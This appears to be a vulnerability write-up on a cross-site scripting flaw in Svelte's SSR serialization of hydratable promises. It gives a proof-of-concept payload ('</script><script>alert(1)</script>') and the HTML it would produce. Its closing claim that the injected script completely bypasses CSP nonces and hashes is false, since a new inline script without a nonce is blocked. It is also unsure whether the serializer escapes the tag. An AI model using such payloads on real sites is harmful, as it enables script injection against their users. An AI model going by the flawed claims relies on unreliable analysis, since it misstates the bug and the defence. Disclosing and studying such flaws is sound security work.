Analysis:
The `Renderer.#hydratable_block` method handles serialization of hydratables during SSR by creating a `<script>` block containing JSON/JS data serialized with `devalue.uneval`. However, the key `k` is serialized using `devalue.uneval(k)`, and the value `v.serialized` is directly interpolated as a raw, unescaped string into the inline `<script>` template on line 903: `[${devalue.uneval(k)},${v.serialized}]`. 

When the value is a promise, `v.serialized` gets updated on promise resolution on line 72 of `packages/svelte/src/internal/server/hydratable.js`: `() => 'r(' + uneval(v) + ')'`. If `v` (the resolved promise value) is a string containing `</script>`, it is serialized by `uneval` as a JS string literal `\"</script>\"` (or containing the exact characters `</script>`). Because the string is interpolated *directly* as JavaScript source code inside the inline `<script>` tag, the browser's HTML parser parses `</script>` as the closing tag for the script block itself, allowing an attacker to inject arbitrary HTML/JS following it (Cross-Site Scripting).

### Conceptual Exploit Payload
A Svelte page contains a hydratable promise, e.g.:
```js
import { hydratable } from 'svelte';
const data = hydratable('my_key', () => Promise.resolve('</script><script>alert(1)</script>'));
```

When SSR runs, this will produce:
```html
<script>
const h = (window.__svelte ??= {}).h ??= new Map();
const r = (v) => Promise.resolve(v);
for (const [k, v] of [
    ["my_key", r("</script><script>alert(1)</script>")]
]) {
    h.set(k, v);
}
</script>
```
The browser parses this as:
```html
<script>
const h = (window.__svelte ??= {}).h ??= new Map();
const r = (v) => Promise.resolve(v);
for (const [k, v] of [
    ["my_key", r("
</script>
<script>alert(1)</script>
")]
]) {
    h.set(k, v);
}
</script>
```
This triggers the alert, completely bypassing any CSP nonces/hashes as the second script block is parsed as a fresh inline script.

